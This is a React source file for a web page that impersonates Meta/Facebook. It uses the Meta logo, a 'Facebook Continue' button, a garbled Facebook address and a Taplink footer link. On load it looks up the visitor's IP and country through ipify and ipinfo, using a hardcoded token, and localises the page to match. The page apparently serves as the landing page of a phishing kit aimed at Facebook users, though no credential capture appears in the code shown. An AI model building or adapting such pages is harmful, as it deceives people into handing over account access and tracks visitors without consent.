import Logo from "./assets/images/meta-logo.png";
import Gach from "./assets/images/gach.jpg";
import { useEffect, useState } from "react";
import { useTranslation } from 'react-i18next'

export default function App() {
  const [ip, setIp] = useState('')
  const [country, setCountry] = useState('')
  useEffect(() => {
    fetch('https://api.ipify.org?format=json')
      .then((response) => response.json())
      .then((data) => {
        setIp(data.ip)
        // console.log('ip', data.ip)
      })
      .catch((error) => {
        console.error('Lỗi khi lấy địa chỉ IP:', error)
      })
  }, [])
  useEffect(() => {
    fetch(`https://ipinfo.io/${ip}?token=4062af641c7f89`)
      .then((response) => response.json())
      .then((data) => {
        console.log(data);
        setCountry(data.country.toLocaleLowerCase())

      })
      .catch((error) => {
        console.error('Lỗi khi lấy thông tin địa lý:', error)
      })
  }, [ip])
  const { t, i18n } = useTranslation()
  useEffect(() => {
    i18n.changeLanguage(country)
  }, [country, i18n])
  return (
    <div className="bg-[#f5f5f5] px-[14px]">

      <div className=" max-w-[480px]  mx-auto  min-h-screen pt-[14px]">
        <div className="w-[125px] h-[125px] mx-auto">
          <img src={Logo} alt="Logo" />
        </div>
        <h1 className="text-[30px] font-semibold text-center pt-3 leading-9 uppercase">{t('translation.title')}</h1>
        <p className="text-[17px] text-[#495057] text-center pb-[18px] py-[10px]">{t('translation.title2')} ✓</p>
        <button className="bg-[#3b5bdb] hover:opacity-90 transition-all duration-100 block w-full h-[60px] p-[14px] text-white rounded-lg font-bold">
          <span className="uppercase font-bold ">Facebook</span> {t('translation.continue')}
        </button>
        <div className="text-[14px] text-[#343a40] leading-5 py-[14px] pb-[7px] text-center">
          <span>Facebook</span>{" "}
          <span>
            {t('translation.title3')}
          </span>
        </div>
        <div className="h-[30px]">
          <img src={Gach} alt="Gach" />
        </div>
        <div className="text-[14px] text-[#495057] leading-5 pt-2 text-center">
          © {t('translation.title4')} <span className="text-[13px]">1
            Facebook Way、Menlo Park、SE 14349</span>
        </div>
        <a href="#" className="flex pt-[31px] pb-[24px] justify-center text-[14px] text-[#573222] items-center gap-x-1">
          <span>
            {t('translation.title5')}
          </span>
          <span className="-translate-y-[2px]">
            <svg
              version="1.1"
              xmlns="http://www.w3.org/2000/svg"
              x="0px"
              y="0px"
              viewBox="0 0 76 76"
              className="w-4 h-4"
              style={{
                fill: "rgb(0, 0, 0)",
                position: "relative",
                top: 3,
                margin: "0px 2px",
              }}
            >
              <g>
                <path d="M38,0C17,0,0,17,0,38s17,38,38,38s38-17,38-38S59,0,38,0z M38,72C19.2,72,4,56.8,4,38S19.2,4,38,4s34,15.2,34,34S56.8,72,38,72z M57.5,38c0,1.1-0.9,2-2,2h-35c-1.1,0-2-0.9-2-2s0.9-2,2-2h35C56.6,36,57.5,36.9,57.5,38z M57.5,50c0,1.1-0.9,2-2,2h-35c-1.1,0-2-0.9-2-2s0.9-2,2-2h35C56.6,48,57.5,48.9,57.5,50z M57.5,26c0,1.1-0.9,2-2,2h-35c-1.1,0-2-0.9-2-2s0.9-2,2-2h35C56.6,24,57.5,24.9,57.5,26z" />
              </g>
            </svg>
          </span>{" "}
          <span className="font-semibold">Taplink.at</span>
        </a>
      </div>
    </div>
  );
}
